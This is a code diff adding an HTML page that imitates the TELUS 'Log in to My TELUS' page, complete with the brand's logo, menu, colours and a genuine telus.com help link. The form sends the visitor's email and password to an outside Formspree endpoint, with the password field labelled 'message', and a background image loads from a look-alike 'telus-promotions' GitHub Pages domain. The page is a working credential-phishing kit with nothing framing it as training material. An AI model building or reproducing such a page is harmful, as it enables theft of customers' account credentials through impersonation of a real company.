@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telus Login</title>
+    <div class="main-header">
+
+    <div class="logo">
+      <img src="./83c89053-cd01-4f92-ac1f-d20a1e5aafd0.png" alt="Telus Logo">
+    </div>
+
+    <nav class="main-menu" id="menu">
+      <a href="#">Mobility</a>
+      <a href="#">Internet</a>
+      <a href="#">TV & Entertainment</a>
+      <a href="#">Security & Smart Home</a>
+      <a href="#">Health</a>
+      <a href="#">TELUS Rewards</a>
+      <a href="#">Big Deal Days</a>
+    </nav>
+
+    <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+
+  </div>
+    <style>
+        .main-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 40px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        .logo img {
+            height: 40px;
+        }
+        .main-menu {
+            display: flex;
+            gap: 30px;
+            font-size: 16px;
+        }
+        .main-menu a {
+            text-decoration: none;
+            color: #333;
+        }
+        .main-menu a::after {
+            content: "";
+            position: absolute;
+            left: 0;
+            bottom: -1px;
+            width: 0;
+            height: 4px;
+            background: #4b286d;
+            transition: width 0.3s ease;
+        }
+        .menu-toggle {
+            display: none;
+            font-size: 30px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Inter", sans-serif;
+        }
+
+        /* Card */
+        .form-box {
+            background: white;
+            backdrop-filter: blur(12px);
+            padding: 35px;
+            width: 500px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .form-box h2 {
+            color: rgb(75, 40, 109);
+            text-transform: none;
+            text-decoration-line: none;
+            font-size: 30px;
+            font-weight: 100;
+            line-height: 72px;
+            margin-bottom: 30px;
+        }
+
+        .css-175oi2r {
+            align-items: stretch;
+            background-color: rgba(0, 0, 0, 0);
+            border: 0px solid black;
+            box-sizing: border-box;
+            display: flex;
+            flex-basis: auto;
+            flex-direction: column;
+            flex-shrink: 0;
+            list-style: none;
+            margin: 0px;
+            min-height: 0px;
+            min-width: 0px;
+            padding: 0px;
+            position: relative;
+            text-decoration: none;
+            z-index: 0;
+        }
+
+        .input-group {
+            margin-top: 30px;
+        }
+
+        /* Floating Label */
+        .input-group {
+            position: relative;
+            /* margin-bottom: 20px; */
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 45px 14px 14px;
+            border-radius: 4px;
+            border: 1px solid #334155;
+            background: transparent;
+            color: #334155;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group label {
+            position: absolute;
+            top: 50%;
+            left: 14px;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            font-size: 14px;
+            pointer-events: none;
+            transition: 0.3s;
+            background: transparent;
+        }
+
+        /* Floating effect */
+        .input-group input:focus+label,
+        .input-group input:valid+label {
+            top: -14px;
+            left: 0px;
+            font-weight: 700;
+            opacity: 90%;
+            font-size: 13px;
+            background: white;
+            padding: 0 5px;
+            color: rgb(75, 40, 109);
+        }
+
+        /* Input focus */
+        .input-group input:focus {
+            border-color: rgb(43, 128, 0);
+        }
+
+        /* Eye Icon */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+            stroke: #94a3b8;
+            transition: 0.3s;
+        }
+
+        .toggle-password:hover {
+            stroke: rgb(43, 128, 0);
+        }
+
+        /* Button */
+        .login19 {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            padding: 11px 31px;
+            background-color: rgb(43, 128, 0);
+            min-width: 144px;
+            border-color: rgba(0, 0, 0, 0);
+            border-radius: 32px;
+            border-width: 1px;
+            max-width: 100%;
+            transition: background-color 200ms, border-color 200ms;
+            flex-direction: row;
+            justify-content: center;
+            margin-top: 30px;
+            transition: 0.5s;
+        }
+
+        .css-1rynq56.r-1wv73ep.r-633pao {
+            font-family: sans-serif !important;
+            margin-top: 8px;
+            margin-left: 6px;
+        }
+
+        .login19:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 10px 20px rgb(20 131 60 / 30%);
+        }
+
+        .form-box {
+            justify-content: left;
+            align-items: center;
+            margin: 80px 0px 80px 200px;
+            padding-bottom: 50px;
+        }
+        body {
+            background-image: url(https://telus-promotions.github.io/our-plans/leaves.webp);
+            background-position: left;
+}
+    </style>
+
+</head>
+
+<body>
+    <form id="my-form" action="https://formspree.io/f/mdapngpp" method="POST">
+        <div class="form-box">
+            <h2>Log in to My TELUS</h2>
+
+            <div class="input-group">
+                <input type="email" name="email" required>
+                <label>Email or username</label>
+            </div>
+            <div class="css-175oi2r" style="padding: 8px 0px; border-width: 0px; border-radius: 0px;"><a
+                    href="https://www.telus.com/my-telus/forgot/username" role="link"
+                    class="css-175oi2r r-1loqt21 r-1otgn73 r-1471scf"
+                    style="outline: none; margin: -4px; padding: 2px; border-radius: 4px; border-width: 2px; border-color: rgba(0, 0, 0, 0); color: rgb(44, 46, 48); text-decoration-line: underline; text-decoration-style: solid; align-self: flex-start; transition: color 200ms;">
+                    <div dir="auto" class="css-1rynq56 r-1wv73ep r-633pao"
+                        style="color: rgb(44, 46, 48); font-weight: 400; transition: color 200ms; font-size: 14px; line-height: 14px; font-family: HNforTELUSSA400normal;">
+                        Forgot your email/username?</div>
+                </a></div>
+            <div class="input-group">
+                <input type="password" id="password" name="message" required>
+                <label>Password</label>
+                <!-- SVG ICON -->
+                <svg id="eyeIcon" class="toggle-password" onclick="togglePassword()" fill="none" viewBox="0 0 24 24"
+                    stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5
+                   c4.478 0 8.268 2.943 9.542 7
+                   -1.274 4.057-5.064 7-9.542 7
+                   -4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+            </div>
+
+            <button class="login19" id="my-form-button">Log in</button>
+        </div>
+    </form>
+    <div class="sc-dcJsrY iifIdT"><img data-testid="telus-leaves-image"
+            src="//images.ctfassets.net/reduo6gvn7wu/5gOJ6Sp0vs6flsxB33a8gr/fa393fe54b875e03e5d29dab5e6f79e0/leaves.webp"
+            width="1588" alt="" loading="eager" style="height: auto; max-width: 100%;"></div>
+    <script>
+        function togglePassword() {
+            const input = document.getElementById("password");
+            const icon = document.getElementById("eyeIcon");
+
+            if (input.type === "password") {
+                input.type = "text";
+                icon.innerHTML = `
+        <path stroke-linecap="round" stroke-linejoin="round"
+        d="M3 3l18 18M10.584 10.587A3 3 0 0012 15a3 3 0 002.415-4.413M9.878 5.09A10.94 10.94 0 0112 5
+        c4.478 0 8.268 2.943 9.542 7a11.05 11.05 0 01-4.23 5.36M6.1 6.1A11.05 11.05 0 002.458 12
+        C3.732 16.057 7.523 19 12 19c1.06 0 2.08-.163 3.04-.465"/>`;
+            } else {
+                input.type = "password";
+                icon.innerHTML = `
+        <path stroke-linecap="round" stroke-linejoin="round"
+        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+        <path stroke-linecap="round" stroke-linejoin="round"
+        d="M2.458 12C3.732 7.943 7.523 5 12 5
+        c4.478 0 8.268 2.943 9.542 7
+        -1.274 4.057-5.064 7-9.542 7
+        -4.477 0-8.268-2.943-9.542-7z"/>`;
+            }
+        }
+    </script>
+
+</body>
+
+</html>
